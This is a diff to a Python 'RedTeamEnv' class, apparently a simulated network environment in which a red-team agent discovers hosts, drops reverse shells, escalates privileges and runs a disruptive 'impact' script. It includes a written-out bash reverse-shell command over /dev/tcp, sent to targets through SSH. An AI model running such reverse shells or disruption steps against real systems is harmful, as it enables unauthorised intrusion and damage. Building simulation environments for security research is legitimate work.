@@ -15,8 +15,8 @@ class RedTeamEnv:
         self.red_agent_node = self.net.get('user0')
         self.observations = {
             'user0': {
-                'IP Address': ipaddress.IPv4Address(self.red_agent_node.IP()), 
-                'Subnet': ipaddress.IPv4Network(self.red_agent_node.IP() + '/24', strict=False),
+                'IP Address': [ipaddress.IPv4Address(self.red_agent_node.IP())], 
+                'Subnet': [ipaddress.IPv4Network(self.red_agent_node.IP() + '/24', strict=False)],
                 'Open Ports': [{'port': 22, 'protocol': 'tcp', 'service': 'ssh'}],
                 'Access': 'root',
             }
@@ -31,12 +31,12 @@ class RedTeamEnv:
 
         # Reachability graph with node metadata
         self.graph = nx.DiGraph()
-        self.graph.add_node('user0', ip=ipaddress.IPv4Address('10.0.0.1'), access='root', open_ports=[22])
+        self.graph.add_node('user0', ip=[ipaddress.IPv4Address('10.0.0.1')], access='root', open_ports=[22])
 
         # Map: hostname -> ipaddress.IPv4Address
         self.host_ip_map = {
-            h.name: ipaddress.IPv4Address(h.IP()) for h in self.net.hosts
-        }
+                    h.name: [ipaddress.IPv4Address(h.IP(intf=intf)) for intf in h.intfList()] for h in self.net.hosts
+                }
 
     def get_observation(self):
         """Return a dict with current view of reachable nodes."""
@@ -54,6 +54,10 @@ class RedTeamEnv:
         selected_node = None
         for node in self.root_access_nodes:
             node_ip = self.host_ip_map.get(node)
+            
+            if node_ip:
+                node_ip = node_ip[0]          
+                
             if node_ip and node_ip in subnet:
                 selected_node = node
                 break
@@ -65,7 +69,7 @@ class RedTeamEnv:
         print(f"[*] {selected_node} executing discovery on subnet {subnet}")
 
         subnet_prefix = str(subnet.network_address).rsplit('.', 1)[0]
-        output = self.execute_command_on(selected_node, f"./{script_path} {subnet_prefix}").strip()
+        output = self.execute_command_on(selected_node, f"bash {script_path} {subnet_prefix}").strip()
 
         for line in output.splitlines():
             if "Host up:" in line:
@@ -73,18 +77,30 @@ class RedTeamEnv:
                 discovered_ip = ipaddress.IPv4Address(discovered_ip_str)
                 target_host = self._resolve_ip_to_host(discovered_ip)
                 if target_host and target_host not in self.graph.nodes:
-                    self.graph.add_node(target_host, ip=discovered_ip, access='unknown')
-                    self.graph.add_edge(selected_node, target_host)
+                    self.graph.add_node(target_host, ip=[discovered_ip], access='unknown')
+                    self.graph.add_edge(selected_node, target_host, type='discovery')
                     
                     self.observations[target_host] = {
-                        'IP Address': discovered_ip,
-                        'Subnet': ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False),
+                        'IP Address': [discovered_ip],
+                        'Subnet': [ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False)],
                         'Open Ports': [],
                         'Access': 'unknown',
                     }
                     
-                    print(f"[+] Discovered: {target_host} ({discovered_ip})")                
-
+                    print(f"[+] Discovered: {target_host} ({discovered_ip})")        
+                    
+                elif target_host and target_host in self.graph.nodes:
+                    # Update existing node with new IP
+                    existing_ip = self.graph.nodes[target_host]['ip']
+                    if discovered_ip not in existing_ip:
+                        self.graph.nodes[target_host]['ip'].append(discovered_ip)
+                        self.observations[target_host]['IP Address'].append(discovered_ip)
+                        self.observations[target_host]['Subnet'].append(ipaddress.IPv4Network(discovered_ip_str + '/24', strict=False))
+                        # print(f"[+] Updated {target_host} with new IP: {discovered_ip}")
+                    
+                    if selected_node != target_host and not self.graph.has_edge(selected_node, target_host):
+                        self.graph.add_edge(selected_node, target_host, type='discovery')
+    
     def discover_network(self, target_ip: str):
         """Run service discovery (Nmap) on the target IP from a reachable root-access node."""
         script_path = "/home/hacker/red_scripts/discover_network.sh"
@@ -147,12 +163,25 @@ class RedTeamEnv:
         # Node colors: green = root, gray = unknown
         node_colors = []
         for _, attr in self.graph.nodes(data=True):
-            if attr.get('access') == 'root':
+            
+            if attr.get('impact'):
                 node_colors.append('red')
+            elif attr.get('access') == 'root':
+                node_colors.append('orange')
             elif attr.get('access') == 'user':
                 node_colors.append('yellow')
             else:
                 node_colors.append('lightgray')
+                
+        # Edge colors: red = reverse shell, gray = discovery
+        edge_colors = []
+        for _, _, attr in self.graph.edges(data=True):
+            if attr.get('type') == 'reverse_shell':
+                edge_colors.append('black')
+            elif attr.get('type') == 'discovery':
+                edge_colors.append('gray')
+            else:
+                edge_colors.append('black')
 
         # Node labels: include IP, access level and service info
         def get_service_info_str(open_ports):
@@ -168,14 +197,14 @@ class RedTeamEnv:
 
         plt.figure(figsize=(10, 6))
         nx.draw(self.graph, pos, with_labels=True, labels=labels, 
-                node_color=node_colors, node_size=2500, font_size=8, edge_color='black')
+                node_color=node_colors, node_size=2500, font_size=8, edge_color=edge_colors, width=2)
         plt.title("Red Team Reachability Graph")
         plt.tight_layout()
         plt.show()
         
     def _resolve_ip_to_host(self, ip: ipaddress.IPv4Address):
         for host, host_ip in self.host_ip_map.items():
-            if host_ip == ip:
+            if ip in host_ip:
                 return host
         return None
 
@@ -242,6 +271,18 @@ class RedTeamEnv:
         """
         attacker_ip = self.host_ip_map[from_host]
         target_ip = self.host_ip_map[to_host]
+        
+        if not attacker_ip or not target_ip:
+            print(f"[!] Cannot Drop reverse shell between {from_host} and {to_host}.")
+            
+        if len(target_ip) > 1 or len(attacker_ip) > 1:
+            print(f"[!] Cannot Drop reverse shell between {from_host} and {to_host}.")
+            return
+        
+        # convert to string
+        target_ip = str(target_ip[0])
+        attacker_ip = str(attacker_ip[0])
+        
         revshell_port = self.host_available_ports.get(from_host)
 
         in_file = f"/home/hacker/input_{revshell_port}.txt"
@@ -269,6 +310,7 @@ class RedTeamEnv:
             f"-o ConnectTimeout=5 {username}@{target_ip} "
             f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\" &"
         )
+        
         print(f"[*] Dropping reverse shell from {to_host} to {from_host}:{revshell_port}")
         result = self.execute_command_on(from_host, command=revshell_cmd).strip()
 
@@ -349,8 +391,12 @@ class RedTeamEnv:
         
     def privilege_escalate(self, target):
         source_node = None
+        target_ip = self.host_ip_map.get(target)
+        if not target_ip or len(target_ip) != 1:
+            raise ValueError(f"[!] Cannot privilege escalate for {target}")
+        
         for node in self.root_access_nodes:
-            if self._is_reachable(node, self.host_ip_map[target]):
+            if self._is_reachable(node, target_ip[0]):
                 source_node = node
                 break
             
@@ -372,14 +418,38 @@ class RedTeamEnv:
                 
                 # Update the graph with the new host
                 if key not in self.graph.nodes:
-                    self.graph.add_node(key, ip=value, access='unknown')
-                    self.graph.add_edge(target, key)
+                    self.graph.add_node(key, ip=[ipaddress.IPv4Address(value)], access='unknown')
+                    self.graph.add_edge(target, key, type='discovery')
                     
                     self.observations[key] = {
-                        'IP Address': value,
-                        'Subnet': ipaddress.IPv4Network(value + '/24', strict=False),
+                        'IP Address': [ipaddress.IPv4Address(value)],
+                        'Subnet': [ipaddress.IPv4Network(value + '/24', strict=False)],
                         'Open Ports': [],
                         'Access': 'unknown',
                     }
                     
                     print(f"[+] Discovered: {key} ({value})")
+
+    def impact(self, target: str):
+        """Run impact.sh from a node in the given subnet with root access."""
+        script_path = "/home/hacker/red_scripts/impact.sh"
+        try:
+            target_ip = self.host_ip_map.get(target)
+            if not target_ip or len(target_ip) != 1:
+                raise ValueError(f"Cannot privilege escalate for {target}")
+        except ValueError as e:
+            print(f"[!] Error — {e}")
+            return
+
+        print(f"[*] Executing impact on target {target}")
+
+        output = self.execute_command_on(target, f"bash {script_path}").strip()
+        
+        if "disrupted" in output:
+            print(f"[+] Impact executed successfully on {target}")
+            
+            self.observations[target]['impact'] = True
+            self.graph.nodes[target]['impact'] = True
+            
+        else:
+            print(f"[!] Impact execution failed on {target}")
